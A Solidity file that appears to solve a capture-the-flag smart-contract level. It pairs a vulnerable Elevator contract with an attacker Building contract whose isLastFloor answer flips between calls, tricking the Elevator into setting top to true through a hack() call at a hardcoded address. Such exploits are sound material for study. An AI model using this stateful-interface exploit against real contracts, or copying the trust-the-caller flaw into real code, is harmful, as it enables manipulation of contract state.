// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/*interface Building {
  function isLastFloor(uint) external returns (bool);
}*/


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building{
    uint256 public num;
    address owner;
    Elevator el = Elevator(0x35467531D83Ed3226C83386d0eE448B9Fdb70A92);

    constructor (address _owner) public{
        num = 0;
        owner = _owner;
    }
    function hack() public{
        el.goTo(1);
    }
    function isLastFloor(uint floor) external returns (bool){
        if (num == 0)
        {
            num = 1;
            return false;
        }
        else
        {
            num = 0;
            return true;
        }
    }
}